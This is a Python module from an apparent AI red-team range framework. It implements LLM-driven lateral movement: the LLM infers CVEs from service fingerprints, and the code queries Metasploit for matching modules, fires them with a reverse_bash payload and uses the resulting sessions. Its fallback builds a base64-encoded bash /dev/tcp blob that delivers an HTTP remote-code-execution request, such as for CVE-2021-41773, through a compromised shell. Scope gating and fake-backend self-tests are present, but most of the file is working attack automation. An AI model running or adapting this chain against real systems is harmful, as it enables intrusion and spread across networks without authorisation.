"""MSF-driven lateral exploitation — the exploit-per-hop lateral-movement primitive.

North Star / option B / project rule "no service->CVE table": red moves laterally by
INFERRING an applicable exploit for the next hop from WHAT IT FINGERPRINTED, then QUERYING
METASPLOIT'S LIVE MODULE CATALOG for modules matching that CVE, firing one through the gate,
confirming a real session (session-diff + marker grounding, out-of-band), and composing the
earned command channel on the next hop as `msf_client.session_execute(sid, cmd)`.

This is Incalmo's `LLMLateralMoveMetasploit` + `MetasploitService.search_exploits/run_exploit`
pattern (third_party/incalmo/incalmo/core/services/metasploit_service.py,
.../llm_agents/msf_lateral_movement/llm_ms_lateral_move.py) rebuilt on OUR floor + log + gate:

    fingerprint (observation)
        -> live_vector.make_llm_vector_planner    (LLM infers candidate CVEs)
        -> swarm.live_msf.confirm_vector          (`search cve:` LIVE msfrpcd catalog)
        -> swarm.msf.gated_msf_exploit            (gate.dispatch -> module_run -> session,
                                                   marker-grounded, confirm->mutate)
        -> MsfClient.session_execute              (earned channel on the next hop)
        -> MsfClient.autoroute_add (optional)     (pivot msfrpcd through the new session)

The gate's complete-mediation boundary stays BEFORE the module fires (inside
`gated_msf_exploit`). An out-of-scope dst is denied before any MSF traffic leaves msfrpcd.
A fingerprint that yields no catalog match, or every module failing to open a session, is an
honest `lateral_failed` — never a fake pop, never a hardcoded fallback.
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import base64
import secrets

from swarm import spine
from swarm.gate import OutOfScope
from swarm.live_msf import confirm_vector
from swarm.msf import gated_msf_exploit, SERVICE_MODULE_MAP
from swarm.live_weapon import ARSENAL as _RESPONSE_ARSENAL, http_rce_request, http_rce_cves
from swarm.polymorph import validate_finding
from swarm import shellsafe  # A2: keep agent dst_ip/port shell-inert in the /dev/tcp delivery


def supported(cve):
    """BUILD-TIME terrain shaper (range_gen only): is `cve` SOMETHING red could plausibly try?
    True iff either red has a shell-deliverable HTTP-RCE for it (live_weapon.http_rce_cves) OR
    msfrpcd's seed catalog knows a module for it (SERVICE_MODULE_MAP; attack time still goes
    through the LIVE catalog, this is just the build-time inventory for terrain shaping)
    OR the response-channel ARSENAL carries a direct host-side exploit (live_weapon.ARSENAL,
    e.g. the struts OGNL channel the entry foothold uses). This is a STATIC UNION used only at
    build time; attack-time CVE selection is the LLM planner + the live msfrpcd catalog."""
    return (cve in http_rce_cves()
            or cve in _RESPONSE_ARSENAL
            or cve in SERVICE_MODULE_MAP)


# ── Response-channel delivery: red's own shell-deliverable exploit, SOURCED FROM live_weapon ──
# The exploit's wire bytes (path, body, headers) live in exactly one place —
# `http_rce_request(cve, cmd)` — shared with the host-side delivery
# (live_weapon.exploit_apache_cgi). Here we only wrap those bytes in a bash /dev/tcp blob and
# send through an earned shell. This is NOT a service->CVE oracle: the LLM must have inferred
# the CVE from its own fingerprint first; this branch just says "red has an impl for X."
def _bash_deliver(dst_ip, port, cve, cmd):
    """Build the shell command that delivers red's HTTP-RCE for `cve` to `dst_ip:port` through
    an earned bash shell. Reads the exploit's bytes from live_weapon (single source of truth).
    Returns None if red has no implementation for `cve`."""
    req = http_rce_request(cve, cmd)
    if req is None:
        return None
    try:                                   # A2: dst_ip/port go into a /dev/tcp shell blob
        dst_ip = shellsafe.host(dst_ip)
        port = shellsafe.port(port)
    except shellsafe.UnsafeValue:
        return None
    method, path, body, headers = req
    header_lines = "\r\n".join(f"{k}: {v}" for k, v in headers.items())
    raw = (f"{method} {path} HTTP/1.0\r\nHost: {dst_ip}\r\n{header_lines}\r\n"
           f"Content-Length: {len(body)}\r\n\r\n{body}")
    script = (f"exec 3<>/dev/tcp/{dst_ip}/{port}; "
              f"printf %s " + "'" + raw.replace("'", "'\"'\"'") + "'" + " >&3; "
              f"cat <&3; exec 3<&-")
    b64 = base64.b64encode(script.encode()).decode()
    return f"echo {b64} | base64 -d | bash"


def _try_response_channel(gate, log, actor, src_name, dst_name, dst_ip, dst_port, cve, exec_fn):
    """Try red's response-channel exploit for `cve` through the vantage's earned shell. The
    gate mediates BEFORE the exploit is delivered. Grounds on the target's OWN uid= in the
    response. Returns a grounded-dict or None (no impl for cve). Never a fake pop."""
    sample = _bash_deliver(dst_ip, dst_port or 80, cve, "id")
    if sample is None:
        return None
    port = dst_port or 80
    nonce = secrets.token_hex(5)

    def _do():
        try:
            out = exec_fn(_bash_deliver(dst_ip, port, cve, f"id; echo DS{nonce}")) or ""
        except Exception as e:                   # noqa: BLE001 — honest delivery failure
            log.append(actor, "lateral_failed",
                       {"dst": dst_name, "cve": cve, "via": "response-channel",
                        "reason": f"delivery error: {type(e).__name__}"})
            return None
        v = validate_finding({"output": out}, log.entries(), "rce")
        if not (v["valid"] and (f"DS{nonce}" in out or "uid=" in out)):
            log.append(actor, "lateral_failed",
                       {"dst": dst_name, "cve": cve, "via": "response-channel",
                        "reason": v["reason"], "out": out[:160]})
            return None
        c = spine.confirm(log, "lateral", dst_name, observed_by="exploit-response",
                          simulated=False, method=f"response:{cve}",
                          marker_confirmed=True, marker_output=out[:160])
        spine.mutate(log, actor, "lateral", dst_name, via_confirm=c["seq"],
                     via="response-channel", cve=cve, src=src_name, as_user="service")
        return {"grounded": True, "cve": cve, "method": f"response:{cve}",
                "session_id": None,
                "exec": (lambda cc: exec_fn(_bash_deliver(dst_ip, port, cve, cc)))}

    try:
        return gate.dispatch(actor, "exploit", dst_name, _do,
                             meta=spine.coords(src_name, dst_ip, port, "T1210", cve=cve))
    except OutOfScope:
        log.append(actor, "gate.block", {"tool": "exploit", "target": dst_name,
                                         "reason": "out-of-scope", "cve": cve})
        return "blocked"


def lateral_exploit(gate, log, *, actor, src_name, dst_name, dst_ip, dst_port,
                    fingerprint, msf, planner, exec_fn=None):
    """Gate-mediated lateral exploit of `dst`. Red's LLM infers CVEs from the fingerprint,
    then tries them in two modalities (both grounded, neither a service->CVE oracle):

      (1) LIVE MSF catalog (Incalmo pattern): `confirm_vector` queries msfrpcd `search cve:`
          and `gated_msf_exploit` fires the top-ranked module — session-diff + marker-grounded;
          earned channel is `msf_client.session_execute(sid, cmd)`.
      (2) Response-channel delivery through the vantage's earned shell (`exec_fn`) for CVEs
          red carries a shell-deliverable implementation of (`_RESPONSE_CHANNEL`). This is
          red's own exploit code, NOT an oracle: the LLM must have inferred the CVE from the
          fingerprint; this branch only says "red can fire that CVE from a shell." Equivalent
          to Incalmo's SSHLateralMove-style capability under exploit-per-hop. Grounds on the
          target's own uid=/nonce in the response.

    Returns {"grounded": bool, "exec": <next-hop channel>|None, "cve": <chosen>|None,
    "method": <msf:module|response:cve>|None, "session_id": sid|None, "blocked": True on OOS}.

      planner      - make_llm_vector_planner(router, log).plan: red's own vector reasoner.
      fingerprint  - a live_fingerprint dict OR a banner string. Red's observation.
      msf          - standup_msfrpcd result ({"client", "options", ...}) or None.
      exec_fn      - the vantage's earned command channel (needed for the response modality).
                     If both `msf` and `exec_fn` are None, lateral is impossible => honest fail.
    """
    if (not msf or not msf.get("client")) and exec_fn is None:
        log.append(actor, "lateral_failed",
                   {"dst": dst_name,
                    "reason": "neither msfrpcd nor an earned shell available for lateral"})
        return {"grounded": False, "exec": None, "cve": None, "method": None,
                "session_id": None}
    # Normalize the fingerprint to a one-line description for the vector planner (the planner's
    # own prompt expects a service string, Incalmo-style). A dict is summarized via live_fingerprint
    # if available; a bare string passes through.
    if isinstance(fingerprint, dict):
        try:
            from swarm.live_fingerprint import summarize as _fp_summary
            fp_text = _fp_summary(fingerprint)
        except Exception:                        # noqa: BLE001
            fp_text = str(fingerprint)[:200]
    else:
        fp_text = (fingerprint or "")

    # ── Inference: red's LLM reasons CVEs from what IT fingerprinted (no CVE handout) ──
    try:
        plan = planner([{"ip": dst_ip, "fingerprint": fp_text}]) or []
    except Exception as e:                       # noqa: BLE001 — planner is strict-abort upstream;
        # we honestly record the miss here so the duel does not crash.
        log.append(actor, "lateral_failed",
                   {"dst": dst_name, "reason": f"vector planner error: {type(e).__name__}"})
        return {"grounded": False, "exec": None, "cve": None, "method": None,
                "session_id": None}
    cves = []
    for row in plan:
        for c in row.get("cves") or []:
            if c not in cves:
                cves.append(c)
    if not cves:
        log.append(actor, "lateral_failed",
                   {"dst": dst_name, "fingerprint": fp_text[:120],
                    "reason": "no CVE inferred from the observed service (red's own reasoning)"})
        return {"grounded": False, "exec": None, "cve": None, "method": None,
                "session_id": None}

    # ── Modality 1: LIVE MSF catalog. For each inferred CVE, `confirm_vector` queries msfrpcd's
    #    `search cve:`; `gated_msf_exploit` fires the top-ranked module through the gate, opens
    #    an msf console, backgrounds the session, confirms by sessions-diff, grounds via a
    #    marker `id` INSIDE the session, confirm->mutate on success. OOS/no-session/ungrounded
    #    => honest lateral_failed (per-attempt). ────────────────────────────────────────────
    chosen = {"cve": None, "module": None}
    if msf and msf.get("client"):
        client = msf["client"]
        options = msf.get("options", {})
        for cve in cves:
            try:
                modules = confirm_vector(client, cve)
            except Exception as e:               # noqa: BLE001 — msfrpcd search failure
                log.append(actor, "lateral_failed",
                           {"dst": dst_name, "cve": cve,
                            "reason": f"msfrpcd search error: {type(e).__name__}"})
                continue
            for module, _rank in modules:
                chosen["cve"], chosen["module"] = cve, module
                try:
                    res = gated_msf_exploit(gate, log, actor, dst_name, client=client,
                                            module=module, rhost=dst_ip, rport=dst_port,
                                            options=options, cve=cve, src_ip=src_name,
                                            state="lateral", src=src_name,
                                            raise_on_block=True)
                except OutOfScope:
                    log.append(actor, "gate.block", {"tool": "msf", "target": dst_name,
                                                     "reason": "out-of-scope", "cve": cve})
                    return {"grounded": False, "exec": None, "cve": cve,
                            "method": f"msf:{module}", "session_id": None, "blocked": True}
                if res:
                    sid = res["session_id"]
                    return {"grounded": True,
                            "exec": (lambda c, _sid=sid: client.session_execute(_sid, c)),
                            "cve": cve, "method": f"msf:{module}", "session_id": sid}
                # gated_msf_exploit already wrote a lateral_failed; try the next module.

    # ── Modality 2: response-channel through the vantage's earned shell. For an inferred CVE
    #    red carries a shell-deliverable implementation of (bash /dev/tcp), fire it via
    #    exec_fn. Gate still mediates FIRST (dispatch BEFORE the request leaves the host). The
    #    LLM must have inferred this CVE from its own fingerprint — so this is red applying its
    #    OWN capability to the service it diagnosed, not a service->CVE lookup. ─────────────
    if exec_fn is not None:
        for cve in cves:
            if http_rce_request(cve, "x") is None:
                continue                         # red carries no shell-deliverable impl
            r = _try_response_channel(gate, log, actor, src_name, dst_name, dst_ip, dst_port,
                                      cve, exec_fn)
            if r == "blocked":
                return {"grounded": False, "exec": None, "cve": cve,
                        "method": f"response:{cve}", "session_id": None, "blocked": True}
            if r is not None:
                return r

    # Exhausted every modality for every inferred CVE.
    log.append(actor, "lateral_failed",
               {"dst": dst_name, "fingerprint": fp_text[:120], "cves_tried": cves,
                "reason": "no modality (MSF catalog + response-channel) landed on the inferred CVEs"})
    return {"grounded": False, "exec": None, "cve": chosen["cve"],
            "method": (f"msf:{chosen['module']}" if chosen["module"] else None),
            "session_id": None}


if __name__ == "__main__":  # offline self-check: FAKE msfrpcd (FakeMsfBackend), FAKE planner
    from swarm.eventlog import EventLog
    from swarm.gate import Gate
    from swarm.msf import FakeMsfBackend, MsfClient
    import tempfile

    log = EventLog(Path(tempfile.mktemp(suffix=".jsonl")))
    log.append("system", "scope", {"in_scope": ["hop_a", "hop_b"]})
    gate = Gate([], log, scope_by_actor={"red": ["hop_a", "hop_b", "crown"]},
                known_hosts=["hop_a", "hop_b", "crown", "oos"])
    # a FakeMsfBackend armed for a specific module+host returns a session that grounds on uid=
    be = FakeMsfBackend()
    be.arm("exploit/unix/webapp/sample_rce", "10.0.0.2",
           extra_cmds={"whoami": "uid=0(root)"})
    msf = {"client": MsfClient(be), "options": {"PAYLOAD": "cmd/unix/reverse_bash"}}

    # The planner's role: given a fingerprint, return candidate CVEs. In the live run this is
    # make_llm_vector_planner(router, log); here we inject a tiny deterministic stand-in that
    # STILL only sees the fingerprint (no ground truth leak).
    def fake_planner(targets):
        fps = (targets[0]["fingerprint"] or "").lower()
        # a plausible inference — nothing in the planner's view says what the HOST really is
        if "sample" in fps or "webapp" in fps:
            return [{"i": 1, "ip": targets[0]["ip"], "fingerprint": targets[0]["fingerprint"],
                     "cves": ["CVE-2099-SAMPLE"], "why": "sample service inferred"}]
        return [{"i": 1, "ip": targets[0]["ip"], "fingerprint": targets[0]["fingerprint"],
                 "cves": [], "why": "no known weapon"}]

    # the FakeMsfBackend's `search` finds the armed module when the query mentions its name;
    # inject it so confirm_vector returns a hit for the inferred CVE.
    be._armed_search = [("exploit/unix/webapp/sample_rce", "excellent")]

    import swarm.live_lateral as _ll

    # confirm_vector is imported at module top; replace the bound reference inside live_lateral.
    _orig_cv = _ll.confirm_vector
    _ll.confirm_vector = lambda c, cve: list(be._armed_search) if cve == "CVE-2099-SAMPLE" else []
    try:
        r = _ll.lateral_exploit(gate, log, actor="red", src_name="hop_a", dst_name="hop_b",
                                dst_ip="10.0.0.2", dst_port=80,
                                fingerprint="Server: SampleWebApp/1.0", msf=msf,
                                planner=fake_planner)
        assert r["grounded"] and callable(r["exec"]) and r["cve"] == "CVE-2099-SAMPLE", r
        assert r["method"].startswith("msf:"), r
        # earned channel calls session_execute on the FAKE backend
        assert "uid=" in (r["exec"]("whoami") or ""), "msf session_execute must work"

        # a fingerprint the planner cannot infer anything from -> honest lateral_failed
        rn = _ll.lateral_exploit(gate, log, actor="red", src_name="hop_a", dst_name="hop_b",
                                 dst_ip="10.0.0.2", dst_port=80,
                                 fingerprint="Server: nginx/1.31.7 (hardened)", msf=msf,
                                 planner=fake_planner)
        assert not rn["grounded"] and rn["cve"] is None, rn

        # floor: an out-of-scope dst is denied by the gate BEFORE any MSF traffic (complete
        # mediation). lateral_exploit returns blocked=True; nothing out-of-scope was fired.
        gate2 = Gate([], log, scope_by_actor={"red": ["hop_a"]}, known_hosts=["hop_a", "oos"])
        rb = _ll.lateral_exploit(gate2, log, actor="red", src_name="hop_a", dst_name="oos",
                                 dst_ip="10.0.0.9", dst_port=80,
                                 fingerprint="Server: SampleWebApp/1.0", msf=msf,
                                 planner=fake_planner)
        assert not rb["grounded"] and rb.get("blocked"), rb

        # no msfrpcd client AND no exec_fn -> honest no-op lateral_failed (no fake pop)
        rno = _ll.lateral_exploit(gate, log, actor="red", src_name="hop_a", dst_name="hop_b",
                                  dst_ip="10.0.0.2", dst_port=80,
                                  fingerprint="Server: SampleWebApp/1.0", msf=None,
                                  planner=fake_planner)
        assert not rno["grounded"], rno
    finally:
        _ll.confirm_vector = _orig_cv

    # MODALITY 2 (response-channel): red's LLM infers CVE-2021-41773 from an Apache 2.4.49
    # fingerprint; MSF has no session module for it (search returns nothing). Red falls back
    # to its own bash /dev/tcp implementation THROUGH an earned shell. Grounds on the target's
    # own uid= in the response — zero handed CVE, nothing fabricated.
    log2 = EventLog(Path(tempfile.mktemp(suffix=".jsonl")))
    log2.append("system", "scope", {"in_scope": ["hop_a", "hop_b"]})
    gate_rc = Gate([], log2, scope_by_actor={"red": ["hop_a", "hop_b"]},
                   known_hosts=["hop_a", "hop_b", "oos"])

    def rc_planner(targets):
        fps = (targets[0]["fingerprint"] or "").lower()
        return [{"i": 1, "ip": targets[0]["ip"], "fingerprint": targets[0]["fingerprint"],
                 "cves": (["CVE-2021-41773"] if "2.4.49" in fps or "apache" in fps else []),
                 "why": ""}]

    def exec_a(cmd):
        # faithful shell: decode the base64 blob (as a real earned bash would) and if it
        # targets 10.0.0.2, return hop_b's real uid= — otherwise empty (no delivery == no pop).
        decoded = ""
        if cmd.startswith("echo ") and "base64 -d" in cmd:
            try:
                decoded = base64.b64decode(cmd.split()[1]).decode()
            except Exception:
                pass
        if "/dev/tcp/10.0.0.2/" in decoded:
            # emulate the real httpd 2.4.49 behavior: echo content-type + the id output
            marker = decoded.split("DS")[-1][:10] if "DS" in decoded else ""
            return "uid=33(www-data) gid=33 groups=33\nDS" + marker
        return ""

    r2 = _ll.lateral_exploit(gate_rc, log2, actor="red", src_name="hop_a", dst_name="hop_b",
                             dst_ip="10.0.0.2", dst_port=80,
                             fingerprint="Server: Apache/2.4.49 (Unix)",
                             msf=None, planner=rc_planner, exec_fn=exec_a)
    assert r2["grounded"] and r2["method"] == "response:CVE-2021-41773", r2
    assert r2["cve"] == "CVE-2021-41773" and r2["session_id"] is None, r2
    assert "uid=" in (r2["exec"]("whoami") or ""), "response-channel earned shell must work"
    muts2 = [e for e in log2.entries() if e["action"] == "state.mutate"
             and (e.get("data") or {}).get("state") == "lateral"]
    assert len(muts2) == 1 and muts2[0]["data"]["via"] == "response-channel", muts2

    # Floor: an OOS dst with a working exec_fn is still denied by the gate before delivery.
    gate_rc2 = Gate([], log2, scope_by_actor={"red": ["hop_a"]}, known_hosts=["hop_a", "oos"])
    rb2 = _ll.lateral_exploit(gate_rc2, log2, actor="red", src_name="hop_a", dst_name="oos",
                              dst_ip="10.0.0.2", dst_port=80,
                              fingerprint="Server: Apache/2.4.49 (Unix)",
                              msf=None, planner=rc_planner, exec_fn=exec_a)
    assert not rb2["grounded"] and rb2.get("blocked"), rb2

    muts = [e for e in log.entries() if e["action"] == "state.mutate"]
    assert len(muts) == 1 and muts[0]["data"]["state"] == "lateral", muts
    assert muts[0]["data"]["src"] == "hop_a" and muts[0]["data"]["module"].startswith("exploit/")
    print("live_lateral ok (TWO MODALITIES: (1) MSF catalog — LLM infers CVEs, confirm_vector "
          "queries msfrpcd, gated_msf_exploit grounds via session-diff+marker, session_execute "
          "is the earned channel; (2) RESPONSE-CHANNEL — bash /dev/tcp through the vantage's "
          "earned shell for CVEs red carries an implementation of, grounds on the target's own "
          "uid=; both gate-mediated BEFORE delivery, both honest-miss on no inferred weapon, no "
          "handed CVE anywhere)")
